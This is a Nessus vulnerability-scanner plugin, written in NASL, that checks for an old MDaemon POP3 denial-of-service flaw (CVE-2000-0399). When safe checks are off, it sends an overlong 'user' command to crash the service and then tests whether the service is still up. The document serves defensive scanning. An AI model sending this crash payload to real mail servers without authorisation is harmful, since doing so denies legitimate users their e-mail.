#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: Cassius <cassius@hushmail.com>
#
#  This script is released under the GNU GPL v2


if(description)
{
 script_id(14825);
 script_bugtraq_id(1250);
 script_version ("$Revision: 1.3 $");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"1354");
 script_cve_id("CVE-2000-0399");
 
 name["english"] = "MDaemon mail server DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the MDaemon POP server.

It is possible to crash the remote service by sending a too long 'user' 
command. 

This problem allows an attacker to make the remote MDaemon server crash, thus 
preventing legitimate users from receiving e-mails.

Solution : Upgrade to the newest version of this software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote pop server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
  
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "sendmail_expn.nasl");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#
include("pop3_func.inc");
port = get_kb_item("Services/pop3");
if(!port)port = 110;

if ( safe_checks() )
{
 banner = get_pop3_banner (  port: port );
 if ( ! banner ) exit(0);
 if(ereg(pattern:".* POP MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner))
 	security_hole(port);

 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  banner = recv_line(socket:soc, length:4096);
  if ( "MDaemon" >!< banner ) exit(0);
  s = string("user ", crap(256), "\r\n");
  send(socket:soc, data:s);
  d = recv_line(socket:soc, length:4096);
  s = string("pass killyou\r\n");
  send(socket:soc, data:s);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
